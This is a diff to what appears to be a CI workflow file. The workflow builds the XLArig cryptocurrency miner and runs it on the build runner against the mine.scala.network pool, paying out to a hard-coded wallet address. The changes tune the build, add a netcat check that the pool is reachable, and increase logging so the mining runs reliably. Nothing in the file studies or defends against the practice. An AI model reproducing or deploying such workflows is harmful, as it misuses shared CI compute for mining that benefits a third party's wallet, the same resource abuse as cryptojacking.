@@ -11,6 +11,10 @@ jobs:
       run: |
         sudo apt-get update
         sudo apt-get install -y wget tar build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+        ldd --version  # Check glibc version
+        cmake --version  # Verify CMake version
+        gcc --version  # Verify compiler version
+      continue-on-error: false
 
     - name: Download and Build XLArig v5.2.4
       run: |
@@ -18,16 +22,23 @@ jobs:
         tar -xvzf v5.2.4.tar.gz
         cd XLArig-5.2.4
         mkdir build && cd build
-        cmake ..
-        make
+        cmake .. -DWITH_OPENCL=OFF -DWITH_CUDA=OFF  # Disable GPU features
+        make -j$(nproc)
       continue-on-error: false
+
+    - name: Verify Pool Connectivity
+      run: |
+        nc -zv mine.scala.network 3333 || echo "Error: Cannot connect to pool mine.scala.network:3333"
+      continue-on-error: true
 
     - name: Run Mining Script
       run: |
         cd XLArig-5.2.4/build
         chmod +x xlarig
+        ldd ./xlarig  # Check linked libraries
         ./xlarig -o mine.scala.network:3333 \
                 -u Ssy2SFtR3rGfjKFA4xxUnGVikpSy7GyfTFbDmjyqSGsuJMJ4K2GSKyK6pApbCy7DBGgf6b5p3fHwV1zHrnVRUjDG7kdm496A8R \
-                -p x -a panthera -t 2
+                -p x -a panthera -t 1 --log-file=xlarig.log
       env:
-        XLARIG_LOG_LEVEL: 2
+        XLARIG_LOG_LEVEL: 3  # Increase verbosity for debugging
+      continue-on-error: false
